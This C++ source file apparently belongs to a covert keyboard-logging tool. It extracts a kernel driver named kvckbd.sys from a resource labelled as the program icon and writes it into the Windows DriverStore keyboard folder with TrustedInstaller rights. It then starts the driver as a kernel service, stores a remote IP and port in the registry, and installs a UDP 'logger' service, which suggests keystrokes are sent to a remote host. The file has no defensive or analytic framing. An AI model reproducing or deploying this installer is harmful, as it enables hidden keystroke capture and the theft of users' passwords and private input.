#include "DriverInstaller.h"
#include "ResourceExtractor.h"
#include "TrustedInstallerExecutor.h"
#include "UdpServiceManager.h"
#include "RegistryConfig.h"
#include "Config.h"
#include "resource.h"
#include "DebugConfig.h"
#include <iostream>
#include <windows.h>
#include <string>

std::wstring DriverInstaller::GetDriverStorePath() noexcept {
    wchar_t windowsDir[MAX_PATH];
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
        wcscpy_s(windowsDir, L"C:\\Windows");
    }
    
    std::wstring driverStoreBase = std::wstring(windowsDir) + 
        L"\\System32\\DriverStore\\FileRepository\\";
    
    WIN32_FIND_DATAW findData;
    std::wstring searchPattern = driverStoreBase + L"keyboard.inf_amd64_*";
    HANDLE hFind = FindFirstFileW(searchPattern.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                FindClose(hFind);
                return driverStoreBase + findData.cFileName;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    return driverStoreBase + L"keyboard.inf_amd64_12ca23d60da30d59";
}

bool DriverInstaller::CreateDriverService(const std::wstring& driverPath) noexcept {
    DEBUG_LOG(L"Creating kvckbd driver service...");
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to open SCM: " << GetLastError() << std::endl;
        return false;
    }
    
    SC_HANDLE hService = CreateServiceW(
        hSCM,
        L"kvckbd",
        L"kvckbd",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),
        nullptr,
        nullptr,
        nullptr,
        nullptr,
        nullptr
    );
    
    if (!hService) {
        DWORD error = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (error == ERROR_SERVICE_EXISTS) {
            DEBUG_LOG(L"Driver service already exists");
            return true;
        }
        
        std::wcerr << L"[DriverInstaller] ERROR: Failed to create driver service: " << error << std::endl;
        return false;
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    DEBUG_LOG(L"Driver service created successfully");
    return true;
}

bool DriverInstaller::StartDriverService() noexcept {
    DEBUG_LOG(L"Starting kvckbd driver...");
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_RUNNING) {
        DEBUG_LOG(L"Driver already running");
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return true;
    }
    
    BOOL success = StartServiceW(hService, 0, nullptr);
    DWORD error = GetLastError();
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    if (!success && error != ERROR_SERVICE_ALREADY_RUNNING) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to start driver: " << error << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Driver started successfully");
    return true;
}

bool DriverInstaller::StopDriverService() noexcept {
    DEBUG_LOG(L"Stopping kvckbd driver...");
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
        DEBUG_LOG(L"Driver already stopped");
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return true;
    }
    
    BOOL success = ControlService(hService, SERVICE_CONTROL_STOP, &status);
    DWORD error = GetLastError();
    
    if (success || error == ERROR_SERVICE_NOT_ACTIVE) {
        for (int i = 0; i < 10 && status.dwCurrentState != SERVICE_STOPPED; ++i) {
            Sleep(500);
            if (!QueryServiceStatus(hService, &status)) {
                break;
            }
        }
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    DEBUG_LOG(L"Driver stopped");
    return true;
}

bool DriverInstaller::DeleteDriverService() noexcept {
    DEBUG_LOG(L"Deleting kvckbd driver service...");
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", DELETE);
    if (!hService) {
        DWORD error = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (error == ERROR_SERVICE_DOES_NOT_EXIST) {
            DEBUG_LOG(L"Driver service does not exist");
            return true;
        }
        
        return false;
    }
    
    BOOL success = DeleteService(hService);
    DWORD error = GetLastError();
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    if (!success && error != ERROR_SERVICE_MARKED_FOR_DELETE) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to delete driver service: " << error << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Driver service deleted");
    return true;
}

bool DriverInstaller::InstallDriverAndService() noexcept {
    DEBUG_LOG(L"Starting installation...");
    
    // Check if registry config exists, if not - write defaults
    std::wstring existingIP, existingPort;
    if (!RegistryConfig::ReadDriverConfig(existingIP, existingPort)) {
        DEBUG_LOG(L"No driver config found, writing defaults");
        if (!RegistryConfig::WriteDriverConfig(
            Config::Driver::DEFAULT_REMOTE_IP,
            Config::Driver::DEFAULT_REMOTE_PORT)) {
            std::wcerr << L"[DriverInstaller] WARNING: Failed to write default config" << std::endl;
        }
    } else {
        DEBUG_LOG(L"Existing driver config found: " << existingIP << L":" << existingPort);
    }
    
    auto files = ResourceExtractor::ExtractFilesFromResource(
        GetModuleHandleW(nullptr), IDR_MAINICON
    );
    
    if (files.empty()) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to extract driver from resources" << std::endl;
        return false;
    }
    
    if (files[0].filename.find(L"kvckbd.sys") == std::wstring::npos) {
        std::wcerr << L"[DriverInstaller] ERROR: kvckbd.sys not found in resources" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Extracted: " << files[0].filename << L" (" << files[0].data.size() << L" bytes)");
    
    std::wstring driverStorePath = GetDriverStorePath();
    std::wstring sysTargetPath = driverStorePath + L"\\kvckbd.sys";
    
    DEBUG_LOG(L"Target path: " << sysTargetPath);
    
    TrustedInstallerExecutor tiExecutor;
    
    DEBUG_LOG(L"Writing driver file...");
    if (!tiExecutor.WriteFileAsTrustedInstaller(sysTargetPath, files[0].data)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write driver file" << std::endl;
        return false;
    }
    
    DWORD attrs = GetFileAttributesW(sysTargetPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        std::wcerr << L"[DriverInstaller] ERROR: Driver file not found after write" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Driver file written successfully");
    
    if (!CreateDriverService(sysTargetPath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to create driver service" << std::endl;
        return false;
    }
    
    if (!StartDriverService()) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to start driver" << std::endl;
        return false;
    }
    
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to get executable path" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Installing logger service...");
    if (!UdpServiceManager::InstallService(exePath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to install logger service" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Starting logger service...");
    if (!UdpServiceManager::StartServiceProcess()) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to start logger service" << std::endl;
    }
    
    std::wcout << L"[DriverInstaller] Installation completed successfully" << std::endl;
    return true;
}

bool DriverInstaller::UninstallDriverAndService() noexcept {
    DEBUG_LOG(L"Starting uninstallation...");
    
    bool allSuccess = true;
    
    DEBUG_LOG(L"Stopping logger service...");
    UdpServiceManager::StopServiceProcess();
    
    DEBUG_LOG(L"Uninstalling logger service...");
    if (!UdpServiceManager::UninstallService()) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to uninstall logger service" << std::endl;
        allSuccess = false;
    }
    
    if (!StopDriverService()) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to stop driver" << std::endl;
        allSuccess = false;
    }
    
    if (!DeleteDriverService()) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to delete driver service" << std::endl;
        allSuccess = false;
    }
    
    std::wstring driverStorePath = GetDriverStorePath();
    std::wstring sysPath = driverStorePath + L"\\kvckbd.sys";
    
    DEBUG_LOG(L"Deleting driver file: " << sysPath);
    
    TrustedInstallerExecutor tiExecutor;
    if (!tiExecutor.DeleteFileAsTrustedInstaller(sysPath)) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to delete driver file" << std::endl;
        allSuccess = false;
    }
    
    DEBUG_LOG(L"Deleting driver registry config...");
    if (!RegistryConfig::DeleteDriverConfig()) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to delete driver config" << std::endl;
        allSuccess = false;
    }
    
    if (allSuccess) {
        std::wcout << L"[DriverInstaller] Uninstallation completed successfully" << std::endl;
    } else {
        std::wcout << L"[DriverInstaller] Uninstallation completed with warnings" << std::endl;
    }
    
    return allSuccess;
}